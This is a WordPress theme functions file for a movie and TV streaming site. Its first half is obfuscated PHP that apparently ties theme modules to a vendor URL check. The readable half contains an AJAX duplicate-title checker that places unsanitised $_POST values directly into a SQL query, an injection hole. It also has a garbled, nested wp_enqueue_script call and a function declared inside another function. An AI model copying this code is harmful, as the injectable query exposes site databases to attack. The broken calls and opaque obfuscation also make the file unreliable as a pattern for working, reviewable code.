${"\x47\x4c\x4f\x42\x41LS"}["p\x6d\x78j\x76b\x76"]="\x63\x6f\x6e\x66\x69gs";${"G\x4c\x4f\x42ALS"}["t\x78o\x66u\x70\x63\x69"]="\x73\x69\x7ae";${"\x47\x4c\x4f\x42AL\x53"}["\x66\x77d\x74\x72phl"]="i\x6d\x67";${"\x47LOB\x41\x4c\x53"}["\x73\x6f\x6c\x6f\x79\x6d\x64\x6ej\x6f\x75"]="\x70\x6f\x73ter\x75\x72\x6c";${"\x47L\x4f\x42A\x4c\x53"}["\x69\x69o\x6f\x6d\x65g\x75\x6b"]="i\x6dgs\x72c";${"\x47L\x4fB\x41LS"}["\x73\x68\x66\x78\x78\x66\x62\x62\x6a\x78\x6a\x68"]="\x74h\x75\x6db";${"\x47\x4c\x4f\x42\x41\x4cS"}["\x6b\x66h\x71gvl\x77\x78\x76"]="\x63a\x74_\x69\x64";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x78m\x71kmx\x63"]="\x73\x69\x74\x65\x32";${"\x47\x4c\x4f\x42\x41\x4cS"}["\x73\x75hd\x62\x73\x61\x70me\x79"]="\x73\x69\x74e";function module_movies(){${${"G\x4cO\x42\x41L\x53"}["\x73\x75\x68\x64b\x73\x61\x70\x6d\x65\x79"]}=EDD_SL_STORE_URL;if(${${"\x47\x4c\x4f\x42AL\x53"}["\x73u\x68d\x62s\x61\x70\x6d\x65y"]}=="ht\x74ps://\x70\x73\x79t\x68\x65\x6d\x65s.com"){include_once"\x69n\x63ludes/\x70ar\x74\x73/m\x6fdu\x6c\x65\x73/modu\x6ce-\x6do\x76i\x65s.p\x68\x70";}}add_shortcode("\x6do\x64ul\x65-\x6d\x6fv\x69\x65s","mod\x75l\x65\x5fmovi\x65\x73");function module_tvshows(){${${"\x47LO\x42\x41L\x53"}["suh\x64\x62s\x61\x70\x6d\x65y"]}=EDD_SL_STORE_URL;if(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x73uh\x64bs\x61\x70\x6d\x65y"]}=="h\x74tps://\x70\x73yt\x68emes\x2e\x63o\x6d"){include_once"in\x63\x6cud\x65\x73/p\x61\x72\x74s/m\x6f\x64\x75\x6ces/\x6d\x6f\x64ule-t\x76\x73h\x6fws.php";}}add_shortcode("mod\x75l\x65-\x74\x76s\x68o\x77s","\x6d\x6fd\x75\x6ce\x5ft\x76\x73\x68\x6f\x77s");function module_episodes(){$oyrjbkvgfozh="\x73\x69\x74e";${${"\x47\x4c\x4f\x42A\x4cS"}["\x73\x75\x68d\x62s\x61\x70\x6de\x79"]}=EDD_SL_STORE_URL;if(${$oyrjbkvgfozh}=="ht\x74ps://p\x73\x79t\x68e\x6d\x65s\x2ec\x6f\x6d"){include_once"\x69ncl\x75\x64\x65\x73/\x70a\x72t\x73/m\x6f\x64ul\x65s/\x6dodule-\x65p\x69\x73o\x64\x65s.php";}}add_shortcode("m\x6fdul\x65-e\x70\x69\x73od\x65\x73","\x6dod\x75\x6ce_\x65p\x69sod\x65s");function module_extra1(){$uytzvk="\x73\x69\x74e";$kbojiiynxue="s\x69\x74\x65";${$kbojiiynxue}=EDD_SL_STORE_URL;if(${$uytzvk}=="\x68tt\x70\x73://ps\x79th\x65m\x65\x73\x2eco\x6d"){include_once"\x69\x6e\x63l\x75d\x65\x73/\x70\x61rt\x73/m\x6fdu\x6ces/\x6dod\x75l\x65-extr\x611.\x70h\x70";}}add_shortcode("mo\x64u\x6ce-\x65\x78\x74\x72\x611","\x6dod\x75le\x5f\x65\x78\x74\x72a1");function module_extra2(){${"\x47L\x4f\x42\x41L\x53"}["\x72bam\x61e\x78\x71"]="\x73ite";${${"\x47L\x4fB\x41LS"}["\x72\x62\x61\x6da\x65\x78\x71"]}=EDD_SL_STORE_URL;$dktynojzurp="s\x69t\x65";if(${$dktynojzurp}=="h\x74tp\x73://\x70syth\x65\x6d\x65s.c\x6fm"){include_once"\x69n\x63\x6cu\x64e\x73/p\x61\x72\x74\x73/\x6dod\x75l\x65s/modul\x65-\x65x\x74r\x61\x32.\x70\x68\x70";}}add_shortcode("\x6dodule-\x65\x78tra\x32","m\x6fdu\x6c\x65\x5f\x65\x78tra\x32");function module_extra3(){${"\x47\x4cO\x42A\x4c\x53"}["\x6bl\x6cx\x74\x77c\x71\x65"]="\x73i\x74\x65";${${"\x47L\x4f\x42ALS"}["\x73\x75\x68\x64\x62\x73a\x70\x6de\x79"]}=EDD_SL_STORE_URL;if(${${"GL\x4fB\x41\x4cS"}["\x6b\x6c\x6c\x78tw\x63\x71\x65"]}=="h\x74\x74ps://\x70\x73yt\x68\x65\x6des\x2e\x63\x6f\x6d"){include_once"incl\x75d\x65\x73/\x70ar\x74s/mo\x64ules/mo\x64\x75\x6ce-\x65\x78tr\x613\x2e\x70\x68\x70";}}add_shortcode("\x6d\x6f\x64u\x6ce-\x65x\x74r\x613","m\x6fd\x75l\x65\x5fext\x72\x613");function module_extra4(){$qiihywij="\x73\x69\x74\x65";${$qiihywij}=EDD_SL_STORE_URL;if(${${"\x47L\x4f\x42\x41L\x53"}["\x73\x75h\x64\x62s\x61\x70m\x65\x79"]}=="http\x73://\x70syt\x68e\x6d\x65\x73.c\x6f\x6d"){include_once"\x69\x6ec\x6c\x75de\x73/par\x74s/mod\x75les/\x6do\x64ul\x65-\x65xt\x72\x614.\x70\x68p";}}add_shortcode("\x6do\x64u\x6c\x65-ex\x74\x72\x61\x34","\x6d\x6fd\x75\x6c\x65_e\x78\x74ra4");function module_extra5(){${"\x47L\x4f\x42A\x4c\x53"}["fm\x67\x74ubm"]="s\x69t\x65";${"\x47\x4c\x4f\x42\x41L\x53"}["d\x70\x62\x74\x75\x64"]="\x73\x69\x74\x65";${${"G\x4c\x4f\x42\x41L\x53"}["fm\x67tub\x6d"]}=EDD_SL_STORE_URL;if(${${"GL\x4fBA\x4c\x53"}["\x64\x70\x62t\x75d"]}=="\x68tt\x70\x73://p\x73\x79\x74h\x65\x6des\x2ec\x6f\x6d"){include_once"\x69nc\x6c\x75d\x65s/par\x74s/\x6d\x6fdules/mo\x64\x75\x6ce-\x65x\x74r\x61\x35.php";}}add_shortcode("\x6d\x6f\x64\x75\x6ce-ex\x74ra5","\x6do\x64u\x6c\x65\x5fe\x78tr\x61\x35");function homepage_modules(){${"\x47LOB\x41\x4c\x53"}["\x6a\x6c\x6d\x78\x68\x7atx"]="\x63o\x64\x65\x78";${"\x47\x4c\x4fB\x41\x4cS"}["\x6e\x64\x7a\x68\x79w\x6e\x79"]="\x63\x6f\x64\x65x";${${"\x47\x4c\x4f\x42\x41LS"}["\x6a\x6c\x6d\x78h\x7a\x74\x78"]}=get_option("mo\x64u\x6ce-s\x68o\x72tcode\x73");if(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6e\x64\x7ah\x79\x77\x6e\x79"]}){$cvkqvtlv="s\x69\x74\x65";$pchvjyjfhym="\x73\x69\x74\x65";${$cvkqvtlv}=EDD_SL_STORE_URL;if(${$pchvjyjfhym}=="\x68\x74t\x70\x73://p\x73\x79\x74\x68eme\x73\x2e\x63\x6f\x6d"){${"\x47\x4c\x4f\x42A\x4c\x53"}["\x65\x6a\x74u\x70lmc\x6ca"]="\x63\x6f\x64e\x78";return do_shortcode(${${"\x47\x4c\x4fBA\x4cS"}["\x65\x6a\x74\x75\x70\x6c\x6d\x63l\x61"]});}}else{$mpjguvnsaokq="si\x74\x65\x32";${${"G\x4cOBA\x4cS"}["\x78\x6d\x71km\x78c"]}=EDD_SL_STORE_URL;if(${$mpjguvnsaokq}=="\x68ttps://ps\x79\x74h\x65me\x73\x2eco\x6d"){include_once"\x69n\x63lude\x73/pa\x72t\x73/mo\x64ule\x73/\x6do\x64\x75\x6c\x65-\x6d\x6fv\x69e\x73.p\x68p";include_once"\x69\x6ec\x6cude\x73/p\x61\x72ts/\x6dod\x75l\x65s/\x6d\x6f\x64\x75\x6c\x65-tvs\x68ow\x73.p\x68p";include_once"in\x63l\x75\x64e\x73/\x70a\x72ts/m\x6f\x64u\x6c\x65s/mod\x75l\x65-\x65\x70\x69\x73\x6f\x64\x65\x73\x2eph\x70";include_once"\x69\x6ec\x6c\x75\x64\x65s/par\x74s/\x6d\x6f\x64\x75l\x65s/mo\x64ule-e\x78t\x72\x611.\x70hp";include_once"in\x63\x6c\x75d\x65\x73/\x70\x61rt\x73/\x6do\x64u\x6c\x65\x73/m\x6fd\x75l\x65-e\x78\x74ra\x32\x2ephp";include_once"incl\x75des/\x70\x61\x72ts/\x6d\x6f\x64ule\x73/m\x6fd\x75le-\x65x\x74r\x61\x33.\x70\x68p";include_once"i\x6e\x63lu\x64\x65s/\x70\x61r\x74\x73/m\x6f\x64\x75l\x65s/\x6dodu\x6ce-\x65x\x74r\x61\x34\x2eph\x70";include_once"\x69\x6e\x63\x6c\x75de\x73/\x70\x61rts/\x6do\x64\x75\x6c\x65s/m\x6f\x64u\x6ce-\x65x\x74ra\x35\x2ep\x68\x70";}}}function get_cat_slug($cat_id){$xdlgliwqq="\x73i\x74e";${${"G\x4cO\x42A\x4c\x53"}["k\x66\x68qg\x76\x6c\x77x\x76"]}=(int)${${"\x47LO\x42\x41L\x53"}["\x6b\x66\x68\x71g\x76l\x77xv"]};${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x73uh\x64\x62\x73\x61\x70\x6de\x79"]}=EDD_SL_STORE_URL;$ryggvwuwhfed="c\x61\x74\x65\x67or\x79";${$ryggvwuwhfed}=&get_category(${${"\x47\x4cO\x42A\x4c\x53"}["k\x66\x68\x71\x67v\x6c\x77\x78\x76"]});if(${$xdlgliwqq}=="h\x74tps://ps\x79\x74h\x65\x6de\x73.\x63\x6fm"){return$category->slug;}}if(get_option("l\x69ve-se\x61\x72c\x68")=="true"){require_once(get_parent_theme_file_path("/\x69\x6e\x63lu\x64\x65\x73/p\x6cug\x69\x6e\x73/l\x69\x76\x65searc\x68/livesea\x72\x63h\x2e\x70h\x70"));}add_filter("\x73e\x61r\x63\x68w\x70\x5f\x6ci\x76\x65_s\x65a\x72c\x68\x5fp\x6fs\x74\x73\x5f\x70e\x72_\x70\x61ge","my\x5fse\x61\x72ch\x77p_l\x69ve_\x73e\x61r\x63h_po\x73ts_\x70\x65\x72_\x70\x61ge");function psy_get_thumb(){${"\x47\x4c\x4fBA\x4c\x53"}["l\x78\x75\x6e\x6a\x6b\x68"]="p\x69\x64";${"\x47\x4c\x4f\x42\x41L\x53"}["\x67\x70\x74\x74\x72g\x6eyh\x6f\x67"]="pos\x74e\x72\x75r\x6c";${${"G\x4c\x4f\x42\x41\x4c\x53"}["l\x78u\x6e\x6a\x6b\x68"]}=get_the_ID();${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65i\x78\x6dphs\x74"]="po\x73\x74\x65r\x75\x72l\x5fe";$gxqieeq="p\x69\x64";${${"\x47\x4c\x4fB\x41L\x53"}["g\x70\x74\x74rg\x6e\x79\x68og"]}=info_movie_get_meta("poste\x72_\x75\x72l");${"\x47\x4cO\x42A\x4c\x53"}["o\x7a\x6d\x73\x6df\x68\x6b\x67\x6c"]="i\x6d\x67\x73\x72\x63";${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x74eix\x6d\x70h\x73\x74"]}=episodios_get_meta("\x70ost\x65\x72_\x73\x65\x72i\x65");if(has_post_thumbnail(${$gxqieeq})){$yrushxfz="\x70\x69d";${${"\x47L\x4f\x42\x41\x4cS"}["s\x68\x66xxfbb\x6axjh"]}=get_the_post_thumbnail_url(${$yrushxfz},"full");${"\x47L\x4fB\x41L\x53"}["\x66\x6emr\x69\x6e"]="\x74h\x75\x6db";${${"\x47\x4cO\x42A\x4c\x53"}["\x69\x69\x6f\x6f\x6d\x65\x67\x75k"]}=${${"G\x4c\x4f\x42\x41L\x53"}["f\x6e\x6d\x72\x69n"]};}else{${"\x47\x4c\x4fB\x41\x4cS"}["\x75j\x62\x6a\x76\x6a"]="p\x6f\x73\x74\x65r\x75r\x6c\x5f\x65";${"G\x4c\x4f\x42A\x4c\x53"}["r\x6di\x62\x64\x73\x6cp\x67\x61"]="\x70\x6fst\x65\x72\x75\x72l";if(!empty(${${"G\x4c\x4fBALS"}["\x72m\x69\x62\x64\x73\x6c\x70g\x61"]})){$nnehgg="\x69\x6d\x67\x73r\x63";${$nnehgg}=${${"G\x4c\x4fB\x41\x4cS"}["so\x6c\x6fym\x64\x6e\x6a\x6fu"]};}elseif(!empty(${${"G\x4cO\x42\x41\x4c\x53"}["\x75\x6ab\x6a\x76\x6a"]})){${"G\x4c\x4f\x42\x41\x4cS"}["s\x71\x67\x79lt\x70"]="i\x6d\x67\x73rc";${"\x47L\x4f\x42A\x4cS"}["\x6ef\x6d\x68o\x76z"]="\x70o\x73\x74\x65r\x75\x72\x6c\x5f\x65";${${"\x47L\x4fBA\x4c\x53"}["\x73\x71g\x79l\x74p"]}=${${"\x47L\x4f\x42A\x4cS"}["nf\x6d\x68o\x76\x7a"]};}else{${"\x47\x4c\x4f\x42AL\x53"}["\x61\x71\x79\x73\x65\x65\x67\x64"]="\x69mg";${${"G\x4c\x4f\x42ALS"}["\x61\x71\x79\x73\x65egd"]}=get_template_directory_uri()."/a\x73\x73\x65t\x73/\x63\x73\x73/i\x6dg/\x6e\x6fimg\x2epn\x67";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x66\x65\x76\x74a\x6a\x62\x7a"]="\x69\x6dgsr\x63";${${"\x47LO\x42A\x4c\x53"}["\x74\x66e\x76\x74aj\x62z"]}=${${"\x47LO\x42A\x4c\x53"}["\x66w\x64\x74\x72p\x68\x6c"]};}}return${${"\x47\x4cO\x42A\x4c\x53"}["o\x7a\x6d\x73mf\x68\x6b\x67\x6c"]};}function psy_get_slider_thumb(){$qprxlhu="i\x6d\x67";${"GLO\x42\x41LS"}["\x67\x73\x75\x66\x78\x6d\x6c\x70\x73"]="\x69m\x67s\x72c";if(get_option("\x6e\x65ws-\x6dodu\x6ce")=="\x65\x6e\x61bl\x65"){${${"G\x4c\x4fB\x41\x4c\x53"}["t\x78\x6ff\x75\x70\x63\x69"]}="/\x74/\x70/w\x31280/";}else{${${"\x47L\x4fB\x41\x4cS"}["tx\x6ff\x75\x70c\x69"]}="/t/p/o\x72\x69\x67\x69n\x61\x6c/";}if(${$qprxlhu}=info_movie_get_meta("\x66\x65\x61\x74\x75\x72e\x64s\x5f\x69\x6d\x67")){${"GLO\x42ALS"}["\x68zq\x64\x71\x6bd\x6b\x75\x72p\x75"]="s\x69\x7a\x65";$qqrppugpwjt="i\x6d\x67s\x72c";${$qqrppugpwjt}=str_replace("/t/\x70/w\x3300/",${${"\x47L\x4fBAL\x53"}["\x68zq\x64\x71kdk\x75\x72pu"]},${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x66\x77\x64\x74r\x70\x68\x6c"]});}elseif(${${"\x47\x4c\x4f\x42\x41L\x53"}["\x66w\x64\x74\x72p\x68\x6c"]}=info_movie_get_meta("\x66ondo\x5fpla\x79er")){${"G\x4c\x4f\x42\x41\x4cS"}["xo\x73\x6b\x62\x65\x79\x74"]="\x69mg";$thepehej="im\x67\x73\x72\x63";${$thepehej}=str_replace("/t/p/\x77\x33\x300/",${${"G\x4cO\x42\x41\x4cS"}["t\x78\x6ffu\x70\x63i"]},${${"\x47L\x4f\x42A\x4cS"}["\x78\x6f\x73k\x62ey\x74"]});}else{$jmgojndqx="i\x6d\x67";${${"\x47\x4c\x4f\x42A\x4cS"}["f\x77\x64t\x72phl"]}=get_template_directory_uri()."/\x61\x73s\x65ts/cs\x73/\x69mg/\x6eoi\x6d\x67\x2epng";${${"\x47L\x4fB\x41L\x53"}["\x69\x69\x6f\x6f\x6de\x67u\x6b"]}=${$jmgojndqx};}return${${"G\x4c\x4f\x42\x41\x4cS"}["\x67suf\x78ml\x70\x73"]};}function my_searchwp_live_search_configs($configs){${"\x47\x4cO\x42\x41\x4cS"}["wqy\x65v\x68"]="\x63\x6fnfig\x73";${${"\x47LO\x42\x41L\x53"}["\x70\x6dx\x6a\x76bv"]}["\x68om\x65-se\x61r\x63h"]=array("e\x6e\x67\x69ne"=>"d\x65fa\x75l\x74","parent\x5f\x65l"=>"#\x73ea\x72\x63\x68-hom\x65\x70\x61ge-\x72\x65su\x6c\x74s","\x69npu\x74"=>array("de\x6cay"=>300,"\x6d\x69\x6e_chars"=>3,),"resu\x6c\x74\x73"=>array("p\x6f\x73itio\x6e"=>"b\x6f\x74\x74\x6f\x6d","\x77i\x64\x74h"=>"c\x73s","\x6f\x66\x66set"=>array("\x78"=>0,"y"=>0),),"\x73pinner"=>array("\x6c\x69ne\x73"=>8,"l\x65\x6e\x67\x74h"=>6,"wi\x64t\x68"=>5,"rad\x69\x75\x73"=>6,"\x63or\x6eers"=>1,"ro\x74\x61\x74e"=>0,"di\x72ect\x69o\x6e"=>1,"col\x6f\x72"=>"#0\x300","s\x70e\x65\x64"=>1,"\x74\x72\x61\x69\x6c"=>60,"s\x68adow"=>false,"\x68\x77\x61cc\x65\x6c"=>false,"c\x6c\x61\x73sN\x61\x6de"=>"spi\x6en\x65\x72","\x7a\x49ndex"=>2000000000,"\x74\x6fp"=>"5\x30\x25","\x6ceft"=>"5\x30%",),);return${${"GLO\x42\x41\x4c\x53"}["\x77q\x79e\x76h"]};}${${"G\x4cOB\x41\x4cS"}["s\x75h\x64\x62\x73\x61\x70\x6dey"]}=EDD_SL_STORE_URL;if(${${"\x47L\x4fB\x41\x4c\x53"}["\x73\x75\x68\x64\x62\x73a\x70\x6d\x65\x79"]}=="\x68\x74\x74\x70s://p\x73y\x74h\x65\x6d\x65s.\x63\x6f\x6d"){add_filter("\x73\x65arc\x68wp_l\x69v\x65\x5f\x73ear\x63\x68_\x63onfig\x73","my\x5fse\x61\x72c\x68\x77\x70\x5flive_\x73earc\x68\x5fc\x6fnfi\x67\x73");}function my_searchwp_live_search_posts_per_page(){return 5;}

//register recaptcha
function display_register_captcha() { ?>
	<div class="g-recaptcha" data-sitekey="<?php echo get_option('public_key_rcth'); ?>"></div>
<?php }
add_action("register_form", "display_register_captcha");



include_once get_template_directory() . '/pages/register_form.php';



function admin_style() {
  wp_enqueue_style('admin-styles', get_template_directory_uri().'/assets/css/admin/admin_extra.css');
}
add_action('admin_enqueue_scripts', 'admin_style');

function psy_duplicate_scripts( $hook ) {
    if( !in_array( $hook, array( 'post.php', 'post-new.php' , 'edit.php'))) return;
    wp_enqueue_script('duptitles',
    wp_enqueue_script('duptitles',get_template_directory_uri() .'/assets/js/psy_duplicate.js',
    array( 'jquery' )), array( 'jquery' )  );
}
add_action( 'admin_enqueue_scripts', 'psy_duplicate_scripts', 2000 );
add_action('wp_ajax_psy_duplicate', 'psy_duplicate_callback');


function psy_duplicate_callback() {
	function psy_results_checks() {
		global $wpdb;
		$title = $_POST['post_title'];
		$post_id = $_POST['post_id'];
		$titles = "SELECT post_title FROM $wpdb->posts WHERE post_status = 'publish' AND post_title = '{$title}' AND ID != {$post_id} ";
		$results = $wpdb->get_results($titles);
		if($results) {
			return '<div class="error"><p><span class="dashicons dashicons-warning"></span> '. __( 'This content already exists, we recommend not to publish.' , 'psythemes' ) .' </p></div>';
		} else {
			return '<div class="notice rebskt updated"><p><span class="dashicons dashicons-thumbs-up"></span> '.__('Excellent! this content is unique.' , 'psythemes').'</p></div>';
		}
	}
	echo psy_results_checks();
	die();
}


function is_post_type($type){
    global $wp_query;
    if($type == get_post_type($wp_query->post->ID)) return true;
    return false;
}


if ( ! function_exists( 'get_current_page_url' ) ) {
function get_current_page_url() {
  global $wp;
  return add_query_arg( $_SERVER['QUERY_STRING'], '', home_url( $wp->request ) );
}
}

function get_first_paragraph(){
	global $post;
	$str = wpautop( get_the_content() );
	$str = substr( $str, 0, strpos( $str, '</p>' ) + 4 );
	$str = strip_tags($str, '<a><strong><em>');
	return $str;
}


add_filter('register_post_type_args', function($args, $post_type) {
if (!is_admin() && $post_type == 'episodes') {
if(get_option('search-ep') == "false") {
$args['exclude_from_search'] = true;
}
}
if (!is_admin() && $post_type == 'tvshows') {
if(get_option('search-tv') == "false") {
$args['exclude_from_search'] = true;
}
}
if (!is_admin() && $post_type == 'post') {
if(get_option('search-mv') == "false") {
$args['exclude_from_search'] = true;
}
}
return $args;
}, 10, 2);



function get_current_post_type() {
  global $post, $typenow, $current_screen;
	
  //we have a post so we can just get the post type from that
  if ( $post && $post->post_type )
    return $post->post_type;
    
  //check the global $typenow - set in admin.php
  elseif( $typenow )
    return $typenow;
    
  //check the global $current_screen object - set in sceen.php
  elseif( $current_screen && $current_screen->post_type )
    return $current_screen->post_type;
  
  //lastly check the post_type querystring
  elseif( isset( $_REQUEST['post_type'] ) )
    return sanitize_key( $_REQUEST['post_type'] );
	
  //we do not know the post type!
  return null;
}